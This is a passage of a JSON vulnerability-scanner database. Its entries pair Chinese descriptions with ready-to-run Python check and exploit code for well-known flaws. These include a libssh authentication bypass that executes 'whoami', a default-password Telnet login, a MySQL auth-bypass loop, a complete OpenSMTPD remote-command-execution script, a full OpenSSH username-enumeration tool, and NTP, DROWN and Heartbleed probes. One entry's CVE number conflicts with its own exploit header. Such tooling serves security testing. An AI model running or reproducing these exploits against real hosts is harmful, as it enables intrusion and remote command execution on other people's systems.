            "poc": "def _verify(host, port, vulns):\n    defaultport = 2601\n    pocdict = {\n        \"vulnname\":\"kinggate_zebra_conf\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        #连接Telnet服务器\n        tlib = telnetlib.Telnet(host, port, timeout=8)\n        #tlib.set_debuglevel(2)\n        #登陆\n        tlib.read_until(b\"Password:\", timeout=8)\n        tlib.write(b\"zebra\\r\\n\")\n        result = tlib.read_until(b\"zrinfo>\", timeout=8)\n        tlib.close()\n        if result.find(b\"zrinfo>\"):\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'passwd zebra'\n            pocdict['proof'] = 'zrinfo> access'\n            pocdict['response'] = result\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "kinggate",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "libssh_bypass_auth",
            "description": "libssh身份绕过漏洞(CVE-2018-10933)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 22\n    pocdict = {\n        \"vulnname\":\"libssh_bypass_auth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        sock = socket.socket()\n        sock.settimeout(8)\n        sock.connect((host, port))\n        message = paramiko.message.Message()\n        transport = paramiko.transport.Transport(sock)\n        transport.start_client()\n        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)\n        transport._send_message(message)\n        spawncmd = transport.open_session(timeout=8)\n        spawncmd.exec_command(\"whoami\")\n        if spawncmd.recv_exit_status() == 0:\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'MSG_USERAUTH_SUCCESS flag'\n            pocdict['proof'] = str(transport.remote_version)\n            pocdict['response'] = str(transport.session_id)\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "ssh",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "memcached_unauth",
            "description": "Memcached未授权访问漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 11211\n    pocdict = {\n        \"vulnname\":\"memcached_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        payload = '\\x73\\x74\\x61\\x74\\x73\\x0a'\n        sock.connect((host, port))\n        sock.send(payload.encode())\n        response = sock.recv(1024).decode()\n        sock.close()\n        if \"STAT version\" in response:\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = 'STAT version found'\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "memcached",
            "param": "ip:port",
            "level": "medium",
            "extfile": ""
        },
        {
            "vulname": "mongodb_server_unauth",
            "description": "MongoDB 服务器未授权漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 27017\n    pocdict = {\n        \"vulnname\":\"mongodb_server_unauth\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        mongo = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=8000)\n        version = mongo.server_info()['version']\n        ok = mongo.server_info()['ok']\n        if version != None and ok != None:\n            pocdict['isvul'] = True\n            pocdict['payload'] = mongo.server_info()['ok']\n            pocdict['proof'] = mongo.server_info()['version']\n            pocdict['response'] = mongo.server_info()\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "mongo",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "moxa_oncell_telnet",
            "description": "Moxa OnCell Telnet未授权访问",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 23\n    pocdict = {\n        \"vulnname\":\"moxa_oncell_telnet\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        #连接Telnet服务器\n        tlib = telnetlib.Telnet(host, port, timeout=6)\n        #tlib.set_debuglevel(2)\n        #登陆\n        result = tlib.read_until(b\"Console terminal type\", timeout=6)\n        tlib.close()\n        if result.find(b\"Console terminal type\"):\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'telnet connect'\n            pocdict['proof'] = 'Console terminal access'\n            pocdict['response'] = result\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "moxa",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "mysql_auth_bypass",
            "description": "Mysql身份认证绕过漏洞(CVE-2012-2122)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 3306\n    pocdict = {\n        \"vulnname\":\"mysql_auth_bypass\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        def connect(host, port):\n            try:\n                conn = pymysql.connect(host=host, port=int(port), user='root', password='bad', database='mysql', charset='utf8')\n                conn.close()\n                return True\n            except:\n                pass\n            return False\n        def try_multi_connect(host,port):\n            start_time = time.time()\n            for i in range(500):\n                if int(time.time() - start_time)> 50:\n                    return False\n                if connect(host, port):\n                    return True\n            return False\n        if try_multi_connect(host, port):\n            pocdict['isvul'] = True\n            pocdict['payload'] = 'multi connect'\n            pocdict['proof'] = 'login success'\n            pocdict['response'] = 'NULL'\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "mysql",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "ntp_ctl_getitem_oob_read",
            "description": "NTP 4.2.8p6-4.2.8p10 OOB read漏洞(CVE-2018-71828)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 123\n    pocdict = {\n        \"vulnname\":\"ntp_ctl_getitem_oob_read\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        payload = '\\x16\\x02\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n        sock.sendto(payload.encode(),(host, port))\n        response = sock.recv(1024).decode('utf8', 'ignore')\n        pattern = r'4.2.8p[0-9]+@'\n        match = re.findall(pattern, response)[0]\n        start_str = match.find('p')\n        end_str = match.find('@')\n        ntp_version = match[start_str+1:end_str]\n        if int(ntp_version)<=10 and int(ntp_version) >=6:\n            pocdict['isvul'] = True\n            pocdict['payload'] = payload\n            pocdict['proof'] = match\n            pocdict['response'] = response\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "# Exploit Title: ntpd 4.2.8p10 - Out-of-Bounds Read (PoC)\n# Bug Discovery: Yihan Lian, a security researcher of Qihoo 360 GearTeam\n# Exploit Author: Magnus Klaaborg Stubman (@magnusstubman)\n# Website: https://dumpco.re/blog/cve-2018-7182\n# Vendor Homepage: http://www.ntp.org/\n# Software Link: https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.8p10.tar.gz\n# Version: ntp 4.2.8p6 - 4.2.8p10\n# CVE: CVE-2018-7182\n\n# Note: this PoC exploit only crashes the target when target is ran under a memory sanitiser such as ASan / Valgrind\n#$ sudo valgrind ./ntpd/ntpd -n -c ~/resources/ntp.conf \n#==50079== Memcheck, a memory error detector\n#==50079== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al. \n#==50079== Using Valgrind-3.10.0 and LibVEX; rerun with -h for copyright info\n#==50079== Command: ./ntpd/ntpd -n -c /home/magnus/resources/ntp.conf\n#==50079== \n#12 Nov 09:26:19 ntpd[50079]: ntpd 4.2.8p10@1.3728-o Mon Nov 12 08:21:41 UTC 2018 (4): Starting\n#12 Nov 09:26:19 ntpd[50079]: Command line: ./ntpd/ntpd -n -c /home/magnus/resources/ntp.conf\n#12 Nov 09:26:19 ntpd[50079]: proto: precision = 1.331 usec (-19)\n#12 Nov 09:26:19 ntpd[50079]: switching logging to file /tmp/ntp.log\n#12 Nov 09:26:19 ntpd[50079]: Listen and drop on 0 v6wildcard [::]:123\n#12 Nov 09:26:19 ntpd[50079]: Listen and drop on 1 v4wildcard 0.0.0.0:123\n#12 Nov 09:26:19 ntpd[50079]: Listen normally on 2 lo 127.0.0.1:123\n#12 Nov 09:26:19 ntpd[50079]: Listen normally on 3 eth0 172.16.193.132:123\n#12 Nov 09:26:19 ntpd[50079]: Listen normally on 4 lo [::1]:123\n#12 Nov 09:26:19 ntpd[50079]: Listen normally on 5 eth0 [fe80::50:56ff:fe38:d7b8%2]:123\n#12 Nov 09:26:19 ntpd[50079]: Listening on routing socket on fd #22 for interface updates\n#==50079== Invalid read of size 1\n#==50079==    at 0x12B8CF: ctl_getitem (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x131BF8: read_mru_list (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x12FD65: process_control (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x1440F9: receive (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x12AAA3: ntpdmain (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x12AC2C: main (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==  Address 0x6c6b396 is 0 bytes after a block of size 6 alloc'd\n#==50079==    at 0x4C28C20: malloc (vg_replace_malloc.c:296)\n#==50079==    by 0x4C2AFCF: realloc (vg_replace_malloc.c:692)\n#==50079==    by 0x17AC63: ereallocz (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x130A5F: add_var (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x130BC5: set_var (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x131636: read_mru_list (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x12FD65: process_control (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x1440F9: receive (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x12AAA3: ntpdmain (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)\n#==50079==    by 0x12AC2C: main (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)                                                                                                                          \n#==50079==\n\n#!/usr/bin/env python\n\nimport sys\nimport socket\n\nbuf = (\"\\x16\\x0a\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x39\\x6e\\x6f\\x6e\\x63\" +\n       \"\\x65\\x3d\\x64\\x61\\x33\\x65\\x62\\x35\\x31\\x65\\x62\\x30\\x32\\x38\\x38\\x38\" +\n       \"\\x64\\x61\\x32\\x30\\x39\\x36\\x34\\x31\\x39\\x63\\x2c\\x20\\x66\\x72\\x61\\x67\" +\n       \"\\x73\\x3d\\x33\\x32\\x2c\\x20\\x6c\\x61\\x64\\x64\\x72\\x00\\x31\\x32\\x37\\x2e\" +\n       \"\\x30\\x2e\\x30\\x2e\\x31\\x00\\x00\\x00\")\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(buf, ('127.0.0.1', 123))",
            "sysname": "ntp",
            "param": "ip:port",
            "level": "low",
            "extfile": ""
        },
        {
            "vulname": "opensmtpd_mailaddr_rce",
            "description": "OpenSMTPD <6.6.2 smtp_mailaddr函数RCE漏洞(CVE-2020-7247)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 25\n    pocdict = {\n        \"vulnname\":\"opensmtpd_mailaddr_rce\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        CMD = 'touch /tmp/x'\n        payload = 'MAIL FROM:<;{0};>\\r\\n'.format(CMD)\n        socket.setdefaulttimeout(8)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        res = sock.recv(1024)\n        if 'OpenSMTPD' in str(res):\n            print(\"[+][{0}] :OpenSMTPD检测\".format(host))\n            sock.send(b'HELO x\\r\\n')\n            res = sock.recv(1024)\n            if '250' in str(res):\n                print(\"[+][{0}] :发送payload\".format(host))\n                sock.send(bytes(payload, 'utf-8'))\n                res = sock.recv(1024)\n                if '250' in str(res):\n                    sock.send(b'RCPT TO:<root>\\r\\n')\n                    sock.recv(1024)\n                    sock.send(b'DATA\\r\\n')\n                    sock.recv(1024)\n                    sock.send(b'\\r\\nxxx\\r\\n.\\r\\n')\n                    response = sock.recv(1024)\n                    sock.send(b'QUIT\\r\\n')\n                    sock.recv(1024)\n                    pocdict['isvul'] = True\n                    pocdict['payload'] = \"MAIL FROM:<;{touch /tmp/x};>\"\n                    pocdict['proof'] = '250 code found'\n                    pocdict['response'] = str(response)\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "# Exploit Title: OpenSMTPD 6.6.2 - Remote Code Execution\n# Date: 2020-01-29\n# Exploit Author: 1F98D\n# Original Author: Qualys Security Advisory\n# Vendor Homepage: https://www.opensmtpd.org/\n# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1\n# Version: OpenSMTPD < 6.6.2\n# Tested on: Debian 9.11 (x64)\n# CVE: CVE-2020-7247\n# References:\n# https://www.openwall.com/lists/oss-security/2020/01/28/3\n#\n# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately\n# escape dangerous characters from user-controlled input. An attacker\n# can exploit this to execute arbitrary shell commands on the target.\n# \n#!/usr/local/bin/python3\n\nfrom socket import *\nimport sys\n\nif len(sys.argv) != 4:\n    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))\n    print(\"E.g. {} 127.0.0.1 25 'touch /tmp/x'\".format(sys.argv[0]))\n    sys.exit(1)\n\nADDR = sys.argv[1]\nPORT = int(sys.argv[2])\nCMD = sys.argv[3]\n\ns = socket(AF_INET, SOCK_STREAM)\ns.connect((ADDR, PORT))\n\nres = s.recv(1024)\nif 'OpenSMTPD' not in str(res):\n    print('[!] No OpenSMTPD detected')\n    print('[!] Received {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] OpenSMTPD detected')\ns.send(b'HELO x\\r\\n')\nres = s.recv(1024)\nif '250' not in str(res):\n    print('[!] Error connecting, expected 250')\n    print('[!] Received: {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] Connected, sending payload')\ns.send(bytes('MAIL FROM:<;{};>\\r\\n'.format(CMD), 'utf-8'))\nres = s.recv(1024)\nif '250' not in str(res):\n    print('[!] Error sending payload, expected 250')\n    print('[!] Received: {}'.format(str(res)))\n    print('[!] Exiting...')\n    sys.exit(1)\n\nprint('[*] Payload sent')\ns.send(b'RCPT TO:<root>\\r\\n')\ns.recv(1024)\ns.send(b'DATA\\r\\n')\ns.recv(1024)\ns.send(b'\\r\\nxxx\\r\\n.\\r\\n')\ns.recv(1024)\ns.send(b'QUIT\\r\\n')\ns.recv(1024)\nprint('[*] Done')\n",
            "sysname": "opensmtpd",
            "param": "ip:port",
            "level": "high",
            "extfile": ""
        },
        {
            "vulname": "openssh_user_enum",
            "description": "openssh用户名枚举漏洞(CVE-2018-15473)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 22\n    pocdict = {\n        \"vulnname\":\"openssh_user_enum\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        socket.setdefaulttimeout(8)\n        sqlstr = 'SELECT extfile FROM hostexploit WHERE vulname=\"openssh_user_enum\"'\n        result = db().execute(sqlstr)[0]['extfile']\n        extpath = os.path.join(GlobalConf().progpath['location'], 'Heaven_Hell/extfile/')\n        sys.path.append(extpath)\n        openssh_client = __import__(result)\n        if openssh_client.checkVulnerable(host, port):\n            pocdict['isvul'] = True\n            pocdict['payload'] = str(openssh_client.random_username_list)\n            pocdict['proof'] = openssh_client.old_parse_service_accept.__str__()\n            pocdict['response'] = \"None\"\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "#!/usr/bin/env python\nimport argparse\nimport logging\nimport paramiko\nimport multiprocessing\nimport socket\nimport string\nimport sys\nimport json\nfrom random import randint as rand\nfrom random import choice as choice\n# store function we will overwrite to malform the packet\nold_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]\n\n# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target\n# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)\nrandom_username_list = []\n# populate the list\nfor i in range(3):\n    user = \"\".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))\n    random_username_list.append(user)\n\n# create custom exception\nclass BadUsername(Exception):\n    def __init__(self):\n        pass\n\n# create malicious \"add_boolean\" function to malform packet\ndef add_boolean(*args, **kwargs):\n    pass\n\n# create function to call when username was invalid\ndef call_error(*args, **kwargs):\n    raise BadUsername()\n\n# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler\ndef malform_packet(*args, **kwargs):\n    old_add_boolean = paramiko.message.Message.add_boolean\n    paramiko.message.Message.add_boolean = add_boolean\n    result  = old_parse_service_accept(*args, **kwargs)\n    #return old add_boolean function so start_client will work again\n    paramiko.message.Message.add_boolean = old_add_boolean\n    return result\n\n# create function to perform authentication with malformed packet and desired username\ndef checkUsername(username, tried=0):\n    sock = socket.socket()\n    sock.connect((args.hostname, args.port))\n    # instantiate transport\n    transport = paramiko.transport.Transport(sock)\n    try:\n        transport.start_client()\n    except paramiko.ssh_exception.SSHException:\n        # server was likely flooded, retry up to 3 times\n        transport.close()\n        if tried < 4:\n            tried += 1\n            return checkUsername(username, tried)\n        else:\n            print('[-] Failed to negotiate SSH transport')\n    try:\n        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))\n    except BadUsername:\n            return (username, False)\n    except paramiko.ssh_exception.AuthenticationException:\n            return (username, True)\n    #Successful auth(?)\n    raise Exception(\"There was an error. Is this the correct version of OpenSSH?\")\n\n# function to test target system using the randomly generated usernames\ndef checkVulnerable():\n    vulnerable = True\n    for user in random_username_list:\n        result = checkUsername(user)\n        if result[1]:\n            vulnerable = False\n    return vulnerable\n\ndef exportJSON(results):\n    data = {\"Valid\":[], \"Invalid\":[]}\n    for result in results:\n        if result[1] and result[0] not in data['Valid']:\n            data['Valid'].append(result[0])\n        elif not result[1] and result[0] not in data['Invalid']:\n            data['Invalid'].append(result[0])\n    return json.dumps(data)\n\ndef exportCSV(results):\n    final = \"Username, Valid\\n\"\n    for result in results:\n        final += result[0]+\", \"+str(result[1])+\"\\n\"\n    return final\n\ndef exportList(results):\n    final = \"\"\n    for result in results:\n        if result[1]:\n            final+=result[0]+\" is a valid user!\\n\"\n        else:\n            final+=result[0]+\" is not a valid user!\\n\"\n    return final\n\n# assign functions to respective handlers\nparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet\nparamiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error\n\n# get rid of paramiko logging\nlogging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\n\narg_parser = argparse.ArgumentParser()\narg_parser.add_argument('hostname', type=str, help=\"The target hostname or ip address\")\narg_parser.add_argument('--port', type=int, default=22, help=\"The target port\")\narg_parser.add_argument('--threads', type=int, default=5, help=\"The number of threads to be used\")\narg_parser.add_argument('--outputFile', type=str, help=\"The output file location\")\narg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help=\"The output file location\")\ngroup = arg_parser.add_mutually_exclusive_group(required=True)\ngroup.add_argument('--username', type=str, help=\"The single username to validate\")\ngroup.add_argument('--userList', type=str, help=\"The list of usernames (one per line) to enumerate through\")\nargs = arg_parser.parse_args()\n\ndef main():\n    sock = socket.socket()\n    try:\n        sock.connect((args.hostname, args.port))\n        sock.close()\n    except socket.error:\n        print('[-] Connecting to host failed. Please check the specified host and port.')\n        sys.exit(1)\n\n    # first we run the function to check if host is vulnerable to this CVE\n    if not checkVulnerable():\n        # most probably the target host is either patched or running a version not affected by this CVE\n        print(\"Target host most probably is not vulnerable or already patched, exiting...\")\n        sys.exit(0)\n    elif args.username: #single username passed in\n        result = checkUsername(args.username)\n        if result[1]:\n            print(result[0]+\" is a valid user!\")\n        else:\n            print(result[0]+\" is not a valid user!\")\n    elif args.userList: #username list passed in\n        try:\n            f = open(args.userList)\n        except IOError:\n            print(\"[-] File doesn't exist or is unreadable.\")\n            sys.exit(3)\n        usernames = map(str.strip, f.readlines())\n        f.close()\n        # map usernames to their respective threads\n        pool = multiprocessing.Pool(args.threads)\n        results = pool.map(checkUsername, usernames)\n        try:\n            if args.outputFile:\n                outputFile = open(args.outputFile, \"w\")\n        except IOError:\n            print(\"[-] Cannot write to outputFile.\")\n            sys.exit(5)\n        if args.outputFormat=='json':\n            if args.outputFile:\n                outputFile.writelines(exportJSON(results))\n                outputFile.close()\n                print(\"[+] Results successfully written to \" + args.outputFile + \" in JSON form.\")\n            else:\n                print(exportJSON(results))\n        elif args.outputFormat=='csv':\n            if args.outputFile:\n                outputFile.writelines(exportCSV(results))\n                outputFile.close()\n                print(\"[+] Results successfully written to \" + args.outputFile + \" in CSV form.\")\n            else:\n                print(exportCSV(results))\n        else:\n            if args.outputFile:\n                outputFile.writelines(exportList(results))\n                outputFile.close()\n                print(\"[+] Results successfully written to \" + args.outputFile + \" in List form.\")\n            else:\n                print(exportList(results))\n    else: # no usernames passed in\n        print(\"[-] No usernames provided to check\")\n        sys.exit(4)\n\nif __name__ == '__main__':\n    main()",
            "sysname": "ssh",
            "param": "ip:port",
            "level": "low",
            "extfile": "openssh_user_enum"
        },
        {
            "vulname": "openssl_drown",
            "description": "OpenSSL Drown跨协议攻击TLS漏洞",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 443\n    pocdict = {\n        \"vulnname\":\"openssl_drown\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        def check_tls(host, port):\n            client_hello = binascii.unhexlify('16030100d8010000d403037d408377c8e5204623867604ab0ee4a140043a4e383f770a1e6b66c2d45d34e820de8656a211d79fa9809e9ae6404bb7bcc372afcdd6f51882e39ac2241a8535090016c02bc02fc00ac009c013c01400330039002f0035000a0100007500000014001200000f7777772e65746973616c61742e6567ff01000100000a00080006001700180019000b00020100002300003374000000100017001502683208737064792f332e3108687474702f312e31000500050100000000000d001600140401050106010201040305030603020304020202')\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(8)\n            sock.connect((host, port))\n            print('[+][{0}]发送Hello数据包'.format(host))\n            sock.send(client_hello)\n            try:\n                data = sock.recv(1024*1024)\n            except:\n                data = ''\n\n            if data:\n                server_hello_len = int(binascii.hexlify(data[3:5]), 16)\n                index = 5\n                index += server_hello_len\n                cert_msg = data[index:]\n\n                return cert_msg\n\n\n        client_hello_payload = binascii.unhexlify('803e0100020015001000100100800200800600400400800700c00800800500806161616161616161616161616161616161616161616161616161616161616161')\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(8)\n        sock.connect((host, port))\n        sock.sendall(client_hello_payload)\n        try:\n            server_hello = sock.recv(10*1024)\n        except:\n            print(\"[-][{0}]无法连接SSLv2\".format(host))\n\n        try:\n            # parse incoming packet to extract the certificate\n            index = 0\n            length = server_hello[index:index + 2]\n            index += 2\n            msg_type = server_hello[index]\n            index += 1\n            session_id = server_hello[index]\n            index += 1\n            cert_type = server_hello[index]\n            index += 1\n            ssl_version = server_hello[index:index + 2]\n            index += 2\n            cert_len = int(binascii.hexlify(server_hello[index:index + 2]), 16)\n            index += 2\n            cipher_spec_len = server_hello[index:index + 2]\n            index += 2\n            conn_id = server_hello[index:index + 2]\n            index += 2\n            cert = server_hello[index:cert_len + 1]\n            data = check_tls(host, port)\n            if data:\n                if cert in data:\n                    print('[+][{0}]SSLv2启用,证书相同'.format(host))\n                else:\n                    print('[+][{0}]SSLv2启用,证书不相同'.format(host))\n                pocdict['isvul'] = True\n                pocdict['payload'] = str(client_hello_payload)\n                pocdict['proof'] = 'SSLv2 found'\n                pocdict['response'] = str(data)\n\n        except:\n            print('[-][{0}]SSLv2未启用')\n\n    except Exception as e:\n        pocdict['exception'] = str(e)\n    vulns.append(pocdict)\n_verify(self.host, self.port, self.vulns)",
            "exp": "",
            "sysname": "openssl",
            "param": "ip:port",
            "level": "low",
            "extfile": ""
        },
        {
            "vulname": "openssl_heartbleed",
            "description": "OpenSSL 心脏滴血漏洞(CVE-2014-0160)",
            "poc": "def _verify(host, port, vulns):\n    defaultport = 443\n    pocdict = {\n        \"vulnname\":\"openssl_heartbleed\",\n        \"isvul\": False,\n        \"vulnhost\":host,\n        \"vulnport\":port,\n        \"payload\":\"\",\n        \"proof\":\"\",\n        \"response\":\"\",\n        \"exception\":\"\",\n    }\n    port = int(port)\n    try:\n        decode_hex = codecs.getdecoder('hex_codec')\n        def h2bin(x):\n            return decode_hex(x.replace(' ', '').replace('\\n', ''))[0]\n\n        hello = h2bin('''\n                16 03 02 00  dc 01 00 00 d8 03 02 53\n                43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\n                bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n                00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n                00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\n                c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\n                c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\n                c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\n                c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11\n                00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04\n                03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19\n                00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08\n                00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13\n                00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00\n                00 0f 00 01 01\n                ''')\n        hb = h2bin('''\n                18 03 02 00 03\n                01 40 00\n                ''')\n\n        def recvall(s, length, timeout=8):\n            endtime = time.time() + timeout\n            rdata = b''\n            remain = length\n            while remain > 0:\n                rtime = endtime - time.time()\n                if rtime < 0:\n                    return None\n                r, w, e = select.select([s], [], [], 5)\n                if s in r:\n                    data = s.recv(remain)\n                    # EOF?\n                    if not data:\n                        return None\n                    rdata += data\n                    remain -= len(data)\n            return rdata\n\n        def recvmsg(s):\n            hdr = recvall(s, 5)\n            if hdr == None:\n                print('[-][{0}]收到EOF响应,服务器关闭连接'.format(host))\n                return None, None, None\n            typ, ver, ln = struct.unpack('>BHH', hdr)\n            pay = recvall(s, ln, 10)\n            if pay == None:\n                print('[-][{0}]收到EOF响应,服务器关闭连接'.format(host))\n                return None, None, None\n            print(' ... 接收: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))\n            return typ, ver, pay\n\n        def hit_hb(s):\n            s.send(hb)\n            while True:\n                typ, ver, pay = recvmsg(sock)\n                if typ == None:\n                    return False\n\n                if typ == 24:\n                    return True\n\n                if typ == 21:\n                    return False\n\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((host, port))\n        print('[+][{0}]发送TLS Hello数据包'.format(host))\n        sock.send(hello)\n\n        while True:\n            typ, ver, pay = recvmsg(sock)\n            if typ == None:\n                return\n            # Look for server hello done message.\n            if typ == 22 and pay[0] == 